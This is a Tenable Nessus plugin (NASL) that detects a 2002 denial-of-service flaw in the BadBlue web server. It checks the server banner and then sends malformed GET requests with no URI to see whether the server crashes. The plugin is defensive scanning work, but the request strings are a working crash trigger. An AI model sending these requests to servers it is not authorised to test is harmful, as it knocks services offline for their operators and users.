#
# (C) Tenable Network Security, Inc.
#

# *untested*
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#


include("compat.inc");

if(description)
{
 script_id(11062);
 script_version ("$Revision: 1.29 $");
 script_cve_id("CVE-2002-1023");
 script_bugtraq_id(5187);
 script_osvdb_id(8612);

 script_name(english:"BadBlue Malformed GET Request Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"By sending an invalid GET request (without any URI), it iss
possible to crash the remote web server. An attacker could exploit 
this vulnerability to make the web server crash continually." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jul/143" );
 script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/07/12");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Invalid GET kills the BadBlue web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service1.nasl", "http_version.nasl");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ( ! banner || "BadBlue/" >!< banner ) exit(0);

if(http_is_dead(port: port)) exit (0);

foreach r (make_list('GET HTTP/1.0\r\n\r\n', 'GET  HTTP/1.0\r\n\r\n'))
{
  r = http_send_recv_buf(port: port, data: r);
  if (isnull(r)) break;
  sleep(1);
}

if(http_is_dead(port: port)) { security_warning(port); }
